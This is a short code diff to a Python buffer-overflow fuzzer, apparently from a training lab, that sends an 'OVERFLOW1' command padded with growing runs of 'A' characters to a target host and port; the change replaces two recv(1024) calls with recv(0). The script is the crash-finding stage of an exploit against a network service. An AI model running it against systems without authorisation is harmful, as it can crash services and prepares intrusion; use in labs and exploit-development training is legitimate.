@@ -14,12 +14,12 @@ while True:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.settimeout(timeout)
 		conn = s.connect((ip, port))
-		s.recv(1024)
+		s.recv(0)
 		print("Fuzzing with {} bytes".format(len(buffer)))
 		msg = "OVERFLOW1 " + buffer + "\r\n"
 		s.send((msg.encode()))
 		buffer = buffer + "A" * 100
-		s.recv(1024)
+		s.recv(0)
 		s.close()
 		time.sleep(1)
 	except:
